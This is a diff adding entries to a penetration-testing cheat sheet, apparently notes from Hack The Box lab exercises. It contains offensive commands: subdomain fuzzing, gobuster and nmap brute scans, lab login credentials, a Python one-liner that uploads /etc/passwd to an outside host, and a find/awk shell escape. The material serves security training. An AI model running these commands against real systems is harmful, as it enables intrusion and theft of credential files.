@@ -1,6 +1,18 @@
 # Cheet Sheet
 
+## Crawling
+### python
+python3 ReconSpider.py http://inlanefreight.com
+
+## Upload
+### python 1-liner
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+
 ## Fuzzing
+
+### fuff
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://94.237.48.60:57525/ -H "Host: FUZZ.inlanefreight.htb" -fs 116
+
 
 ### Gobuster
 gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
@@ -63,3 +75,9 @@ impacket-mssqlclient backdoor:Password1@10.129.149.195 -windows-auth
 
 ## Oracle-TNS
 sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute
+
+### Windows RDP
+xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
+
+## Find shell
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
